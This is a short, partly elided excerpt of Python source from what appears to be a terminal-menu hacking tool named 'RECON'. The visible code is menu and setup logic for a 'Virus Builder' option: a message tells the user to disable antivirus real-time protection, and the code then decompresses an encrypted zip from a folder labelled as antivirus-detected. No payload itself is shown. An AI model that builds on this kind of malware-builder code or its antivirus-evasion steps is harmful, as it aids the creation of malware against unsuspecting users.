...
while True:
   try:
      ...
      choice = input(MainColor(f""" ┌──({white}{username_pc}@recon)─{blue}[{white}~/{os_name}/Menu-{menu_number}]
 └─{white}$ {reset}"""))
      ...
      if choice in ['N', 'n', 'NEXT', 'Next', 'next']:
         ...
         messagebox.showinfo(f"RECON {version_tool} - Virus Builder", "It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
         try:
            ...
            if not os.path.exists(file_path):
               if os.path.exists(zip_file_path):
                  print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Decompression of the encrypted file: {white}Program\\FileDetectedByAntivirus\\Password(recon).zip")
